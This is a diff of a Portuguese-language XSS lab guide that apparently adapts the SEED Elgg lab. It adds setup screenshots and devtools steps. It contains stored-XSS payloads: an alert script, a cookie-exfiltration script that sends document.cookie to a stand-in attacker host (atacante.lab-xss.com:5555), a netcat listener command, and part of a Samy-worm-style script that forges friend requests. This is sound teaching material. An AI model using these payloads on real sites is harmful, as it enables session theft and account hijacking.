@@ -50,11 +50,26 @@ samy     | seedsamy
 ----------------------------
 ```
 
+> [!IMPORTANT]  
+> Recomendamos executar esse laboratório no Google Chrome ou Firefox para facilitar o CTRL+C e CTRL+V
+
+Todas as tarefas deste lab serão executadas a partir da máquina Linux que pode ser acessada através do serviço `https-webtop` nos recursos do lab:
+
+![serviço https-webtop](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/new-lab/xss/lab09-xss-seed/images/lab-xss-1.png)
+
+Ao clicar no link pela primeira vez, seu navegador exibirá um alerta sobre o Certificado SSL auto-assinado. Você pode aceitar os riscos clicando como ilustrado na figura abaixo.
+
+![aceitar certificado ssl](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/new-lab/xss/lab09-xss-seed/images/lab-xss-2.png)
+
+Depois de carregar a área de trabalho da máquina Linux, clique em aceitar para permitir o compartilhamento do clipboard (CTRL+C e CTRL+V compartilhado). Você verá na área de trabalho o link para o Navegador web (Chromium) e o Terminal que serão usados nas tarefas abaixo:
+
+![area de trabalho](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/new-lab/xss/lab09-xss-seed/images/lab-xss-3.png)
+
 ## Tarefa 1: Postando uma Mensagem Maliciosa para Exibir uma Janela de Alerta
 
 O objetivo desta tarefa é incorporar um programa JavaScript no perfil do usuário atacante no Elgg, de modo que, quando outro usuário vítima visualizar o perfil do atacante, o programa JavaScript será executado e uma janela de alerta será exibida.
 
-Acesse a aplicação Elgg e faça o login com usuário `samy` (senha `seedsamy`) e adicione o seguinte programa JavaScript no campo de "descrição" do perfil do usuário. O código a seguir exibirá uma janela de alerta ao visualizar o perfil:
+Acesse a aplicação Elgg e faça o login com usuário `samy` (senha `seedsamy`) e adicione o seguinte programa JavaScript no campo de "descrição" do perfil do usuário (meno no canto superior direito > Profile > Edit profile -- utilize a opção "Edit HTML"). O código a seguir exibirá uma janela de alerta ao visualizar o perfil:
 
 ```
 <script>alert('XSS');</script>
@@ -74,16 +89,18 @@ O objetivo desta tarefa é incorporar um programa JavaScript no perfil do atacan
 
 Na tarefa anterior, o código JavaScript malicioso escrito pelo atacante pode imprimir os cookies do usuário, mas apenas o usuário pode ver os cookies, não o atacante. Nesta tarefa, o atacante quer que o código JavaScript envie os cookies para si mesmo. Para conseguir isso, o código JavaScript malicioso precisa enviar uma requisição HTTP para o atacante, com os cookies anexados à requisição.
 
-Podemos fazer isso fazendo com que o JavaScript malicioso insira uma tag `<img>` com seu atributo `src` configurado para a máquina do atacante. Quando o JavaScript insere a tag `img`, o navegador tenta carregar a imagem a partir da URL no campo `src`; isso resulta em uma requisição HTTP GET enviada para a máquina do atacante. O JavaScript apresentado abaixo envia os cookies para a porta 5555 da máquina do atacante (com endereço aqui configurado como `atacante-xss.local`), onde o atacante tem um servidor TCP escutando na mesma porta.
+Podemos fazer isso fazendo com que o JavaScript malicioso insira uma tag `<img>` com seu atributo `src` configurado para a máquina do atacante. Quando o JavaScript insere a tag `img`, o navegador tenta carregar a imagem a partir da URL no campo `src`; isso resulta em uma requisição HTTP GET enviada para a máquina do atacante. O JavaScript apresentado abaixo envia os cookies para a porta 5555 da máquina do atacante (com endereço aqui configurado como `atacante.lab-xss.com`), onde o atacante tem um servidor TCP escutando na mesma porta.
 
 ```
-<script>document.write('<img src=http://atacante-xss.local:5555?c=' + escape(document.cookie) + ' >'); </script>
+<script>document.write('<img src=http://atacante.lab-xss.com:5555?c=' + escape(document.cookie) + ' >'); </script>
 ```
 
-Um programa comumente usado por atacantes é o `netcat` (ou `nc`), que, se executado com a opção "-l", se torna um servidor TCP que escuta uma conexão na porta especificada. Esse programa servidor basicamente imprime tudo o que é enviado pelo cliente e envia ao cliente tudo o que é digitado pelo usuário que está executando o servidor. Digite o comando abaixo para escutar na porta 5555:
+Um programa comumente usado por atacantes é o `netcat` (ou `nc`), que, se executado com a opção "-l", se torna um servidor TCP que escuta uma conexão na porta especificada. Esse programa servidor basicamente imprime tudo o que é enviado pelo cliente e envia ao cliente tudo o que é digitado pelo usuário que está executando o servidor. 
+
+Abra o Terminal e digite o comando abaixo para escutar na porta 5555:
 
 ```
-nc -lknv 5555
+nc -lknv -p 5555
 ```
 
 A opção `-l` é usada para especificar que o nc deve escutar por uma conexão de entrada em vez de iniciar uma conexão com um host remoto. A opção `-nv` é usada para fazer com que o nc forneça uma saída mais detalhada. A opção `-k` significa que, quando uma conexão é concluída, deve-se escutar por outra.
@@ -95,6 +112,16 @@ Nesta e na próxima tarefa, realizaremos um ataque semelhante ao que Samy fez ao
 Nesta tarefa, precisamos escrever um programa JavaScript malicioso que falsifique requisições HTTP diretamente do navegador da vítima, sem a intervenção do atacante. O objetivo do ataque é adicionar Samy como amigo da vítima. Utilizaremos mais uma vez o usuário `samy` no servidor Elgg.
 
 Para adicionar um amigo para a vítima, devemos primeiro descobrir como um usuário legítimo adiciona um amigo no Elgg. Mais especificamente, precisamos descobrir o que é enviado ao servidor quando um usuário adiciona um amigo. A ferramenta de inspeção HTTP do seu navegador (ferramentas de desenvolvedor) pode nos ajudar a obter essas informações. Ela pode exibir o conteúdo de qualquer mensagem de requisição HTTP enviada pelo navegador. A partir do conteúdo, podemos identificar todos os parâmetros na requisição.
+
+Para abrir as Ferramentas de Desenvolvedor no Chromium, clique no menu da direita (três pontos na vertical) e depois "Mais Ferramentas" > Ferramentas do desenvolvedor. Ver imagem abaixo:
+
+![ferramentas desenvolvedor](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/new-lab/xss/lab09-xss-seed/images/lab-xss-4.png)
+
+Agora clique no menu superior em "Members" e depois clique em "Alice" e clique em "Add friend". Na tela das Ferramentas de Desenvolvedor, clique na aba "Network" e mais abaixo você deve ver a requisição HTTP correspondente à ação de adicionar amigo. Clique na requisição para visualizar o Payload.
+
+![payload add friend](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/new-lab/xss/lab09-xss-seed/images/lab-xss-5.png)
+
+Modifique o código javascript abaixo (na linha "Mude Aqui!!") com o caminho da requisição que vc identificou.
 
 ```
 <script type="text/javascript">
@@ -116,6 +143,10 @@ window.onload = function () {
 }
 </script>
 ```
+
+Note que o ID do usuário na requisição é equivalente ao ID de "Alice" (`/action/friends/add?friend=56`), como o objetivo é que outros usuários se tornem amigos de "samy", temos que identificar o ID de Samy! Você pode identificar o ID de Samy a partir da lista de membros, inspecionando o código HTML correspondente:
+
+![Obter ID de Samy](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/new-lab/xss/lab09-xss-seed/images/lab-xss-6.png)
 
 O código acima deve ser colocado no campo "Sobre Mim" (`About Me`) da página de perfil de Samy. Este campo oferece dois modos de edição: modo Editor (padrão) e modo Texto. O modo Editor adiciona código HTML extra ao texto digitado no campo, enquanto o modo Texto não adiciona. Como não queremos nenhum código extra adicionado ao nosso código de ataque, o modo Texto deve ser ativado antes de inserir o código JavaScript acima. Isso pode ser feito clicando em "Editar HTML", que pode ser encontrado no canto superior direito do campo de texto "Sobre Mim".
 
